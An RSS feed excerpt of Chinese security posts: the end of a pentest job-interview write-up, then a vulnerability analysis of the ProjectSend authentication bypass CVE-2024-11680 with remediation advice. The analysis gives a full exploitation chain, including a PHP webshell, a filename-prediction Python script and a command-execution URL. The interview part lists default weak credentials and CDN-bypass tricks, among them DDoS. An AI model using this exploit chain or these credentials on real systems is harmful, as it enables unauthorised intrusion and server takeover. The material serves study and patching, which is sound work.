&lt;ol style=&quot;list-style-type:decimal&quot;&gt;&lt;li&gt;我主要是对Java代码审计⽐较熟悉，例如⼀般Spring Boot项⽬中，&lt;/li&gt;
&lt;li&gt;使⽤mybatis框架处理sql语句，其中${包裹的参数如果是⽤户可控的就可能存在sql注⼊。&lt;/li&gt;
&lt;li&gt;Java中的命令执⾏函数，Runtime类的exec⽅法和ProcessBuilder类&lt;/li&gt;
&lt;li&gt;反序列化函数和类加载函数，例如readObject、Classload.defineClass类加载⽅法等。&lt;/li&gt;
&lt;li&gt;通过pom.xml排查引⼊的框架版本是否存在漏洞。&lt;/li&gt;
&lt;li&gt;还有⽂件上传/⽂件读取接⼝是否有充⾜限制，是否存在任意⽂件上传和⽂件任意读取&lt;/li&gt;
&lt;li&gt;还了解⼀些例如codeql、Fortify SCA⾃动化代码审计⼯具&lt;/li&gt;&lt;/ol&gt;


&lt;h4&gt;16、Shiro-550 反序列化漏洞有了解嘛，简单讲下？&lt;/h4&gt;
&lt;p&gt;shiro反序列化漏洞的特征：cookie里有remember字段&lt;br&gt;
在整个漏洞利用过程中，比较重要的是AES加密的密钥，该秘钥默认是默认硬编码的，所以如果没有修改默认的密钥，就自己可以生成恶意构造的cookie了。&lt;br&gt;
检测的话，利用burp抓包，更改cookie，可以看到响应包中的rememberMe=deleteMe字段&lt;/p&gt;


&lt;h4&gt;17、如果⽹站有CDN，你如何查看他的真实IP地址&lt;/h4&gt;
&lt;ol style=&quot;list-style-type:decimal&quot;&gt;&lt;li&gt;多地ping主域名、⼦域名，利⽤冷⻔国家的服务器来ping&lt;/li&gt;
&lt;li&gt;查询cdn解析历史&lt;/li&gt;
&lt;li&gt;利⽤cdn⼯具&lt;/li&gt;
&lt;li&gt;通过ping错误的⼦域名，如果⽬标服务器开启了模糊域名，就可以直接看到真实ip&lt;/li&gt;
&lt;li&gt;ddos打光cdn流量，再ping就是真实IP&lt;/li&gt;
&lt;li&gt;通过ssrf绕过cdn&lt;/li&gt;
&lt;li&gt;通过反弹shell直接得到IP&lt;/li&gt;
&lt;li&gt;敏感信息泄露，例如phpinfo中就有ip&lt;/li&gt;
&lt;li&gt;社⼯，进⾏邮件往来，邮件头上就会有IP&lt;/li&gt;&lt;/ol&gt;


&lt;h4&gt;18、在校期间打过什么比赛，介绍下，再讲下让你印象最深刻的比赛？&lt;/h4&gt;
&lt;p&gt;（这里师傅们就靠自己脑补了）自己就把自己打过的比赛和获奖说下，大公司还是蛮注重你在大学期间的比赛成绩的。&lt;/p&gt;


&lt;h3&gt;0x3 一面总结&lt;/h3&gt;
&lt;p&gt;给大家的建议：&lt;br&gt;
开始也是跟师傅们说了，最后面给师傅们分享下面试的一些小技巧，因为最近也是蛮多师傅们问我面试找工作的一些事情，然后也算是给师傅们分享下了。&lt;br&gt;
首先，我们再进行投递简历的时候，得海投，多去招聘网站，比如BOSS、牛客网、猎聘等进行投递简历，然后简历呢多学会吹吹牛逼，因为hr会先进行一次简历的筛选（你说你面试都没有面都被淘汰了，是不是很可惜）&lt;br&gt;
其次，就是面试笔记，也就是面经的重要性了，包括我认识的好几个师傅人家技术水平虽然说不是那么厉害，但是人家面试不论是护网还是找工作面试官都对他的印象很好的，所以说面试笔记得多看多背&lt;br&gt;
最后，就是有些师傅问我面过了好几家公司，拿到了好几家公司的office，怎么选择呢，这里我的建议是得看师傅自己的未来一个规划，然后要是能像国企那样的，比较稳定的那种优先，因为目前行业不是很好，然后就是能提升学历就提升学历去，现在裁员也越来越严重。&lt;/p&gt;


&lt;h3&gt;0x4 二面面试官的问题：&lt;/h3&gt;

&lt;h4&gt;1、问了我最近在做什么，学什么方向的东西？&lt;/h4&gt;
&lt;p&gt;这个我就是正常回答嘛，说最近在找实习，然后前段事件在面你们渗透测试岗位，然后目前也是在准备面试相关的事情。&lt;br&gt;
然后学习的话，平常主要还是以src漏洞挖掘和一些攻防演练的课程进行学习，跟着别的师傅一起学。&lt;/p&gt;


&lt;h4&gt;2、问了我简历上面写着有过培训经历，问我有过哪方面的培训？&lt;/h4&gt;
&lt;p&gt;这个主要是大学期间给学校的信安小组啊，还有就是跟着别的安全团队搞过比赛的培训，还有就是有过简单的SRC漏洞挖掘的培训&lt;/p&gt;


&lt;h4&gt;3、问对Windows和linux系统了解多少？&lt;/h4&gt;
&lt;p&gt;回答的是对windows、Linux系统熟悉，然后也对windows、linux系统进行过相关的测试、攻击&lt;/p&gt;


&lt;h4&gt;4、windows和linux查看计划任务⽤那些命令？&lt;/h4&gt;
&lt;p&gt;&lt;strong&gt;windows:&lt;/strong&gt;&lt;br&gt;
at 只⽤与windows server&lt;br&gt;
schtasks&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;linux:&lt;/strong&gt;&lt;br&gt;
at添加⼀次性计划任务。&lt;br&gt;
cat /etc/crontab 查看系统任务&lt;/p&gt;


&lt;h4&gt;5、Linux后台有⼀个进程，你需要找到他的程序执⾏⽂件，该怎么找？&lt;/h4&gt;
&lt;ol style=&quot;list-style-type:decimal&quot;&gt;&lt;li&gt;已知程序名称：ps -aux | grep name&lt;/li&gt;
&lt;li&gt;已知端⼝：netstat -anp |grep port&lt;/li&gt;
&lt;li&gt;已知pid：ps -aux | grep pid&lt;/li&gt;&lt;/ol&gt;


&lt;h4&gt;6、在渗透测试中，你知道常见的端口有哪些？&lt;/h4&gt;
&lt;p&gt;我这里给师傅们汇总了下（蛮全的，需要面试的可以看看我这个）&lt;br&gt;
21端口：FTP&lt;/p&gt;

&lt;p&gt;22端口：ssh&lt;/p&gt;

&lt;p&gt;23端口：Telent服务&lt;/p&gt;

&lt;p&gt;25端口：邮件&lt;/p&gt;

&lt;p&gt;80端口：HTTP服务&lt;/p&gt;

&lt;p&gt;443端口：HTTPS服务&lt;/p&gt;

&lt;p&gt;445端口：公共文件系统&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;1433端口：sql server&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;1521端口：Oracle&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;3306端口：mysql&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;27017端口：MongoDB&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;3389端口：远程桌面端口&lt;/p&gt;

&lt;p&gt;6379端口：redis&lt;/p&gt;

&lt;p&gt;7001端口：weblogic&lt;/p&gt;

&lt;p&gt;8080端口：8080端口是被用于WWW代理服务的，可以实现网页浏览，比如tomcat&lt;/p&gt;


&lt;h4&gt;7、你知道那些web中间件漏洞？&lt;/h4&gt;
&lt;ol style=&quot;list-style-type:decimal&quot;&gt;&lt;li&gt;tomcat put写任意⽂件和远程代码执⾏&lt;/li&gt;
&lt;li&gt;log4j2 远程代码执⾏&lt;/li&gt;
&lt;li&gt;nginx 解析漏洞&lt;/li&gt;
&lt;li&gt;activeMQ 反序列化&lt;/li&gt;
&lt;li&gt;fastjson 反序列化&lt;/li&gt;
&lt;li&gt;jenkins 远程命令执⾏&lt;/li&gt;&lt;/ol&gt;


&lt;h4&gt;8、假如现在给你⼀个⽹站，你会怎么样去进⾏渗透测试，说⼀下你的思路&lt;/h4&gt;
&lt;ul&gt;&lt;li&gt;1、首先确定我们要挖的公司资产&lt;/li&gt;
&lt;li&gt;2、使用wps，新建一个exec表格，里面新建好几个表格，备注比如：根域名、子域名、小程序、app以及漏洞提交进度等情况&lt;/li&gt;
&lt;li&gt;3、上爱企查看这个企业的知识产权，然后看网站备案，然后看这个公司的股权穿透图，这里有一个找边缘资产的好方法，就是看股权穿透图找下面的子公司，但是不同的企业src收录标准不一&lt;/li&gt;
&lt;li&gt;4、使用小蓝本查该公司的一个小程序、app，然后保存在exec表格里面&lt;/li&gt;
&lt;li&gt;5、使用oneforall工具进行子域名挖掘，然后保存到一个txt里面，再使用灯塔进行子域名挖掘，再汇总，然后使用无影工具里面的辅助模块进行资产分类&lt;/li&gt;
&lt;li&gt;6、使用灯塔ARL自动化跑，去找一些文件泄露的漏洞&lt;/li&gt;&lt;/ul&gt;


&lt;h4&gt;9、如何判断是否CDN？&lt;/h4&gt;
&lt;ol style=&quot;list-style-type:decimal&quot;&gt;&lt;li&gt;多地ping&lt;/li&gt;
&lt;li&gt;nslookup&lt;/li&gt;
&lt;li&gt;nmap端⼝扫描出来特别多的web⽹站也可能是，有⼀次扫出来4000多nginx&lt;/li&gt;
&lt;li&gt;全局cdn通过查as号判断（不确定，不主动提及）&lt;/li&gt;&lt;/ol&gt;


&lt;h4&gt;10、要是ping都⼀样就能判断真的没有CDN了吗？&lt;/h4&gt;
&lt;p&gt;有可能使⽤的是全局CDN，通过查as号判断&lt;/p&gt;


&lt;h4&gt;11、要是给你⼀个登陆框，可能存在什么样的漏洞？&lt;/h4&gt;
&lt;ol style=&quot;list-style-type:decimal&quot;&gt;&lt;li&gt;弱⼝令、空⼝令&lt;/li&gt;
&lt;li&gt;sql注⼊&lt;/li&gt;
&lt;li&gt;⽤户枚举&lt;/li&gt;
&lt;li&gt;登陆认证绕过，例如Nacos的cookie=Nacos-Server&lt;/li&gt;
&lt;li&gt;短信轰炸&lt;/li&gt;
&lt;li&gt;短信验证码爆破&lt;/li&gt;
&lt;li&gt;框架漏洞，例如shiro、struts2&lt;/li&gt;&lt;/ol&gt;


&lt;h4&gt;12、你漏洞挖掘中，比较熟悉的几个框架可以讲下嘛？&lt;/h4&gt;
&lt;p&gt;若依框架&lt;br&gt;
spring-boot还有就是spring二次开发的框架&lt;br&gt;
jeecg框架&lt;br&gt;
bladex框架&lt;br&gt;
Nacos系统&lt;br&gt;
然后上面的框架系统的话有很多的nday漏洞，还有一些可以利用工具执行的漏洞，比如常见的若依框架登录系统，常见的弱口令很多，ry:admin123和admin:admin123，进去以后就有很多的nday可以打，然后没登陆进去还有就是druid协议，可以使用弱口令druid:druid，还有就是shiro默认密钥。&lt;/p&gt;


&lt;h4&gt;13、⽐较喜欢⽤哪⼏种⼯具，它们的优势是什么？&lt;/h4&gt;
&lt;p&gt;sqlmap⾃动化的sql注⼊，速度快准确度⾼，可以直接getshell&lt;br&gt;
nmap扫描端⼝，轻量级软件，好⽤效率⾼。&lt;br&gt;
xray漏扫，扫描漏洞速度快⽽且⽐较准确&lt;br&gt;
burpsuite抓包⼯具，好⽤，可以重放请求和爆破。&lt;/p&gt;


&lt;h4&gt;14、你了解spring框架漏洞吗&lt;/h4&gt;
&lt;ol style=&quot;list-style-type:decimal&quot;&gt;&lt;li&gt;CVE-2018-1260 Spring Security Oauth2 远程代码执⾏&lt;/li&gt;
&lt;li&gt;CVE-2018-1271 Spring MVC ⽬录穿越漏洞&lt;/li&gt;
&lt;li&gt;CNVD-2016-04742 Spring Boot 框架 SPEL 表达式注⼊漏洞&lt;/li&gt;
&lt;li&gt;CVE-2014-3578 Spring Framework ⽬录遍历漏洞&lt;/li&gt;
&lt;li&gt;CVE-2022-22947 Spring Cloud Gateway SpEL表达式注⼊命令执⾏&lt;/li&gt;&lt;/ol&gt;


&lt;h4&gt;15、说⼀下你最难忘的挖洞经历？&lt;/h4&gt;
&lt;p&gt;第一次挖出漏洞是在漏洞盒子的公益项目中提交的，第一次是出的存储型XSS漏洞，给了一个低危，然后挖的edusrc第一个是弱口令，在企业src和众测中挖出来的第一个漏洞都是未授权，比如nacos、druid未授权，直接拼接路径即可&lt;/p&gt;


&lt;h4&gt;16、常⻅的中间件解析漏洞有哪些&lt;/h4&gt;
&lt;p&gt;解析漏洞是指web服务器因对http请求处理不当导致将⾮可执⾏的脚本，⽂件等当做可执⾏的脚本，⽂&lt;br&gt;
件等执⾏。&lt;br&gt;
该漏洞⼀般配合服务器的⽂件上传功能使⽤，以获取服务器的权限。&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;漏洞：&lt;/strong&gt;&lt;br&gt;
IIS 5.x/6.0解析漏洞&lt;br&gt;
IIS 7.0/IIS 7.5/nginx0.8.3解析漏洞&lt;br&gt;
Nginx&lt;/p&gt; 


&lt;h3&gt;0x5 二面总结&lt;/h3&gt;

&lt;p&gt;今天呢，给师傅们分享下杭州某科技渗透测试岗位二面的过程，主要是给师傅们分享下面试的一个过程和感触，面试题不是重点，因为面试过程也没有录音，所以有些面试的问题也不是记得特别全（主打一个总结）。&lt;br&gt;
开始一面不是跟师傅们说了嘛，一面主要是某科技的安服工程师和那边的一个项目经理一起面试我。二面就是那边某那边的一个级别应该那边负责人吧，也是一个技术面试，我猜测三面应该就是他们那边的HR面试了，三面应该就是谈薪资的一个过程了。这篇面试分享的文章呢，其实之前就已经想给师傅们分享了，但是呢前段时间一直有别的事情比较忙，又是护网，又是工作方面的一些事情，所以拖到今天给师傅们分享下了&lt;/p&gt;
























</description><link>https://zone.huoxian.cn/d/2963</link><guid isPermaLink="false">https://zone.huoxian.cn/d/2963</guid><pubDate>Fri, 20 Dec 2024 05:32:39 GMT</pubDate><author>routing</author><category>原创文章</category><category>应用安全</category><category>实战攻防</category><category>安全运营</category></item><item><title>【Nday漏洞分析】ProjectSend 身份认证绕过漏洞(CVE-2024-11680)</title><description>&lt;h2&gt;0x01 组件简介&lt;/h2&gt;
&lt;p&gt;ProjectSend 是一个开源文件共享网络应用程序，旨在促进服务器管理员和客户端之间的安全、私密文件传输。&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;fofa语法：body=&quot;ProjectSend&quot;&lt;/code&gt;&lt;/pre&gt;

&lt;h2&gt;0x02 漏洞描述&lt;/h2&gt;

&lt;p&gt;近日，VulnCheck 分配了 CVE-2024-11680，ProjectSend r1720 之前的版本存在身份认证绕过漏洞。远程未经身份验证的攻击者可以通过向 options.php 发送精心设计的 HTTP 请求来利用此漏洞，从而在未经授权的情况下修改应用程序的配置。成功利用此漏洞后，攻击者可嵌入恶意代码、开启创建帐户功能并上传 webshell&lt;/p&gt;

&lt;h2&gt;0x03 影响版本&lt;/h2&gt;
&lt;p&gt;ProjectSend &amp;lt; r1720&lt;/p&gt;

&lt;h2&gt;0x04 环境搭建&lt;/h2&gt;
&lt;h4&gt;0x01 下载&lt;/h4&gt;
&lt;p&gt;环境要求：&lt;/p&gt;

&lt;p&gt;php 7.4或者以上&lt;/p&gt;

&lt;p&gt;MySQL 5.0或者以上（如果您使用的是 8.x 或更高版本，请设置数据库的身份验证方法，使其使用 MySQL 本机密码）&lt;/p&gt;

&lt;p&gt;Apache 2.2 or NGINX&lt;/p&gt; 

&lt;p&gt;使用phpstudy集成环境进行搭建，开启apache,mysql服务&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://cdn.z.wiki/autoupload/20241128/fu0B/882X529/image.png&quot; title=&quot;&quot; alt=&quot;882X529/image.png&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;

&lt;p&gt;去官网下载projectsend代码&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://github.com/projectsend/projectsend/releases%E4%B8%8B%E8%BD%BD%E5%8F%97%E5%BD%B1%E5%93%8D%E7%9A%84%E7%89%88%E6%9C%AC&quot; rel=&quot;ugc noopener nofollow&quot; target=&quot;_blank&quot;&gt;https://github.com/projectsend/projectsend/releases下载受影响的版本&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;这里下载了r1650 版本&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://cdn.z.wiki/autoupload/20241128/dAEj/1420X1114/image.png&quot; title=&quot;&quot; alt=&quot;1420X1114/image.png&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;

&lt;p&gt;解压到phpstudy目录&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://hv.z.wiki/autoupload/20241128/gy8c/1146X985/image.png&quot; title=&quot;&quot; alt=&quot;1146X985/image.png&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;

&lt;p&gt;访问http://localhost/projectsend/install/make-config.php进行配置&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://hv.z.wiki/autoupload/20241128/D2W6/1461X1447/image.png&quot; title=&quot;&quot; alt=&quot;1461X1447/image.png&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;

&lt;p&gt;在小皮中设置数据库名，用户名，密码&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://hv.z.wiki/autoupload/20241128/UXnB/846X268/image.png&quot; title=&quot;&quot; alt=&quot;846X268/image.png&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;

&lt;p&gt;设置完回到刚才的安装页面，修改页面中相应的字段后即可安装&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://cdn.z.wiki/autoupload/20241128/1yfg/673X352/image.png&quot; title=&quot;&quot; alt=&quot;673X352/image.png&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;

&lt;p&gt;按照提示进行下一步安装即可&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://hv.z.wiki/autoupload/20241128/Xnry/1501X1435/image.png&quot; title=&quot;&quot; alt=&quot;1501X1435/image.png&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;

&lt;p&gt;如下图所示，安装完成&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://cdn.z.wiki/autoupload/20241128/FnfU/1587X718/image.png&quot; title=&quot;&quot; alt=&quot;1587X718/image.png&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;

&lt;p&gt;正常能登陆的话是这样的&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://hv.z.wiki/autoupload/20241128/MTes/2178X1318/image.png&quot; title=&quot;&quot; alt=&quot;2178X1318/image.png&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;

&lt;h2&gt;0x05 漏洞分析&lt;/h2&gt;

&lt;p&gt;根据漏洞补丁可以看到该漏洞是由于在header.php文件中设置不同级别的授权，以限制给定用户允许的功能，授权检查可确保用户已登录并具有正确的权限级别。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://cdn.z.wiki/autoupload/20241128/LEJn/934X480/image.png&quot; title=&quot;&quot; alt=&quot;934X480/image.png&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;

&lt;p&gt;其中大部的文件都调用了该权限验证的文件header.php&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;include_once ADMIN_VIEWS_DIR . DS . &#39;header.php&#39;;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;但是，这个文件调用是在其他代码执行完后才调用的，所以导致了可以未授权执行文件中的代码后，才进行权限验证&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://hv.z.wiki/autoupload/20241128/fKLW/1369X1261/image.png&quot; title=&quot;&quot; alt=&quot;1369X1261/image.png&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;

&lt;p&gt;修复后的代码：&lt;br&gt;
重新定义了log_in_required函数，作为权限认证函数调用&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://cdn.z.wiki/autoupload/20241128/4fXf/1167X616/image.png&quot; title=&quot;&quot; alt=&quot;1167X616/image.png&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;

&lt;p&gt;打了补丁后的代码则是在每个文件的开头就进行了权限验证，然后在每个需要用到权限的功能时，在文件开头就调用了该权限验证的函数，以阻止未授权的代码执行&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://hv.z.wiki/autoupload/20241128/o8BX/1137X1095/image.png&quot; title=&quot;&quot; alt=&quot;1137X1095/image.png&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;

&lt;h2&gt;0x06 漏洞验证&lt;/h2&gt;

&lt;h3&gt;漏洞验证&lt;/h3&gt;
&lt;p&gt;在漏洞介绍中通过向options.php发送特殊请求来触发漏洞&lt;/p&gt;

&lt;p&gt;简单验证：&lt;br&gt;
我们先以管理员的身份登陆站点，访问options.php页面&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://cdn.z.wiki/autoupload/20241129/51Mn/1378X1464/image.png&quot; title=&quot;&quot; alt=&quot;1378X1464/image.png&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;

&lt;p&gt;是一个修改网站配置的地方，用管理员的cookie修改一下配置，改了一下标题，能够正常修改成功&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://cdn.z.wiki/autoupload/20241129/yJyM/1767X640/image.png&quot; title=&quot;&quot; alt=&quot;1767X640/image.png&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;

&lt;p&gt;根据之前的漏洞分析我们可以得知，修改配置的代码其实是在权限验证之后的，所以我们使用一个正常未登陆的cookie的去测试能否修改配置文件，（csrf_token的值也要重新获取一遍）&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://cdn.z.wiki/autoupload/20241129/6Ycl/2119X1411/image.png&quot; title=&quot;&quot; alt=&quot;2119X1411/image.png&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://hv.z.wiki/autoupload/20241129/F5fK/1767X778/image.png&quot; title=&quot;&quot; alt=&quot;1767X778/image.png&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;

&lt;p&gt;使用正常未登陆的cookie直接修改标题成功（如果没有获取cookie的话，也不能修改成功），到这一步就能证明漏洞存在了&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://hv.z.wiki/autoupload/20241129/NuqR/1362X751/image.png&quot; title=&quot;&quot; alt=&quot;1362X751/image.png&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;

&lt;h3&gt;漏洞利用&lt;/h3&gt;

&lt;p&gt;系统默认情况下是没有开启注册的，但是我们可以利用这个漏洞使系统开启注册功能和文件上传功能&lt;br&gt;
clients_can_register，clients_auto_approve 和 clients_can_upload&lt;/p&gt;

&lt;p&gt;看回显200的话就是开启成功了&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://cdn.z.wiki/autoupload/20241129/ArBj/1747X691/image.png&quot; title=&quot;&quot; alt=&quot;1747X691/image.png&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;


&lt;p&gt;开启后就可以注册一个用户了，看回显示的话，请求头中有这个特征&quot;Location: my_files/index.php&quot;即为成功&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://hv.z.wiki/autoupload/20241129/6CaI/1837X831/image.png&quot; title=&quot;&quot; alt=&quot;1837X831/image.png&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;


&lt;p&gt;使用刚才注册的用户projectsendtest，正常可以登陆&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://hv.z.wiki/autoupload/20241129/MSUt/2494X669/image.png&quot; title=&quot;&quot; alt=&quot;2494X669/image.png&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;

&lt;p&gt;利用 options.php 上的漏洞，将 .php 添加到允许上传文件的扩展名白名单中&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://hv.z.wiki/autoupload/20241129/U1m0/1726X751/image.png&quot; title=&quot;&quot; alt=&quot;1726X751/image.png&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;

&lt;p&gt;看回显，200即为开启成功&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://hv.z.wiki/autoupload/20241129/B0Wm/1603X771/image.png&quot; title=&quot;&quot; alt=&quot;1603X771/image.png&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;

&lt;p&gt;上传文件&lt;br&gt;
文件内容：&amp;lt;?php system($_GET[&#39;cmd&#39;]);?&amp;gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://cdn.z.wiki/autoupload/20241129/7hZj/2379X960/image.png&quot; title=&quot;&quot; alt=&quot;2379X960/image.png&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;

&lt;p&gt;点击save&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://hv.z.wiki/autoupload/20241129/IqcP/1348X1113/image.png&quot; title=&quot;&quot; alt=&quot;1348X1113/image.png&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;

&lt;p&gt;要记录这个点击上传文件时的时间（不准的时候可能会相差个一两秒，可以通过列举前后几秒的形式来生成）&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://hv.z.wiki/autoupload/20241129/FF8t/1935X843/image.png&quot; title=&quot;&quot; alt=&quot;1935X843/image.png&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;

&lt;p&gt;上传的文件名为以下格式&lt;br&gt;
{timestamp}-{sha1(username)}-{filename}&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;#!/usr/bin/env python3
# coding=utf-8
import datetime
import pytz
import hashlib
#上传文件的时间
date = &#39;2024-11-29 20:21:51&#39;
beijing_time =datetime.datetime.strptime(date, &#39;%Y-%m-%d %H:%M:%S&#39;)
#时区要和options.php里面的时区一致，一般默认安装的话是Shanghai,如果不是的话，可以通过未授权的操作改下这个时区为Shanghai
beijing_tz = pytz.timezone(&#39;Asia/Shanghai&#39;)
localized_beijing_time = beijing_tz.localize(beijing_time)
timestamp = int(localized_beijing_time.timestamp())
#注册的用户名
input_string=&#39;projectsendtest&#39;
sha1 = hashlib.sha1()
sha1.update(input_string.encode(&#39;utf-8&#39;))
hash_value = sha1.hexdigest()
#上传的文件名，这里为cmd.php
name=&#39;{}-{}-{}&#39;.format(timestamp,hash_value,&#39;cmd.php&#39;)
print (name)&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;改时区的操作&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://hv.z.wiki/autoupload/20241129/I3jG/1857X687/image.png&quot; title=&quot;&quot; alt=&quot;1857X687/image.png&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;

&lt;p&gt;这里上传的时间为2024-11-29 20:21:51，文件名为cmd.php,sha1(projectsendtest)为197aaa8708c5ce35805cd8001c02430de03ba0d8&lt;/p&gt;

&lt;p&gt;最后生成的文件名为：&lt;br&gt;
1732882911-197aaa8708c5ce35805cd8001c02430de03ba0d8-cmd.php&lt;/p&gt;

&lt;p&gt;访问上传的文件名，（upload/files/为默认上传目录）并执行命令：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;http://projectsend1128.com:8087/projectsend/upload/files/1732882911-197aaa8708c5ce35805cd8001c02430de03ba0d8-cmd.php?cmd=whoami #执行命令成功&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;img src=&quot;https://hv.z.wiki/autoupload/20241129/FyQN/1513X379/image.png&quot; title=&quot;&quot; alt=&quot;1513X379/image.png&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;

&lt;h2&gt;0x07 漏洞影响&lt;/h2&gt;
&lt;p&gt;通过以上过程，我们可以看到该漏洞危害极大，且该漏洞利用难度也极低，可以通过未授权开启注册用户，并利用注册用户上传webshell文件，所以有相关组件的用户，应该及时进行修复，避免后续遭利用。&lt;/p&gt;


&lt;h2&gt;0x08 修复建议&lt;/h2&gt;
&lt;p&gt;1.升级版本&lt;br&gt;
目前官方已有可更新版本，建议受影响用户升级至最新版本：ProjectSend &amp;gt;= r1720&lt;br&gt;
官方补丁下载地址：&lt;a href=&quot;https://github.com/projectsend/projectsend/commit/193367d937b1a59ed5b68dd4e60bd53317473744&quot; rel=&quot;ugc noopener nofollow&quot; target=&quot;_blank&quot;&gt;https://github.com/projectsend/projectsend/commit/193367d937b1a59ed5b68dd4e60bd53317473744&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;最新安全版本：&lt;a href=&quot;https://github.com/projectsend/projectsend/releases/tag/r1720&quot; rel=&quot;ugc noopener nofollow&quot; target=&quot;_blank&quot;&gt;https://github.com/projectsend/projectsend/releases/tag/r1720&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;2.临时措施:&lt;br&gt;
设置upload/files/.htaccess目录中为不可执行，在.htaccess文件中加上下面的字段即可&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;php_flag engine off&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;img src=&quot;https://hv.z.wiki/autoupload/20241129/LFnw/654X622/image.png&quot; title=&quot;&quot; alt=&quot;654X622/image.png&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;

&lt;p&gt;设置完，则无法可执行PHP代码&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://cdn.z.wiki/autoupload/20241201/9qXd/1356X1146/image.png&quot; title=&quot;&quot; alt=&quot;1356X1146/image.png&quot; referrerpolicy=&quot;no-referrer&quot;&gt;&lt;/p&gt;
&lt;h2&gt;0X09 参考链接&lt;/h2&gt;
&lt;p&gt;&lt;a href=&quot;https://github.com/projectsend/projectsend/commit/193367d937b1a59ed5b68dd4e60bd53317473744&quot; rel=&quot;ugc noopener nofollow&quot; target=&quot;_blank&quot;&gt;https://github.com/projectsend/projectsend/commit/193367d937b1a59ed5b68dd4e60bd53317473744&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://github.com/projectdiscovery/nuclei-templates/blob/main/http/vulnerabilities/projectsend-auth-bypass.yaml&quot; rel=&quot;ugc noopener nofollow&quot; target=&quot;_blank&quot;&gt;https://github.com/projectdiscovery/nuclei-templates/blob/main/http/vulnerabilities/projectsend-auth-bypass.yaml&lt;/a&gt;&lt;/p&gt;

